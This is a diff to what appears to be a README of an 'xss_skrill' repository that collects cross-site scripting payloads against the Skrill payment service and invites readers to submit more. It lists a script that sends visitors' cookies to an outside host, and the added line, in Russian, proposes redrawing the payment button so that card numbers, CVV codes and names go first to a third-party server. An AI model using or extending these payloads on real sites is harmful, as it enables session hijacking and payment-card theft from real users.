@@ -8,6 +8,8 @@ xss_skrill
 
 Write you example of XSS and we post it here :)
 
+0) Был предложен вариант перерисовки новой кнопки отправки введенных данных сначала на сторонний сервер(карта, номер, cvv, фио и вся информация), а потом ттолько на SKRILL
+
 1) `"><script>alert()</script>` 
 
 2) `"><script language= "JavaScript">document.location="http://atastycookie.me/skrill/xss.php?cookie=" + document.cookie;document.location="http://atastycookie.me"</script>`
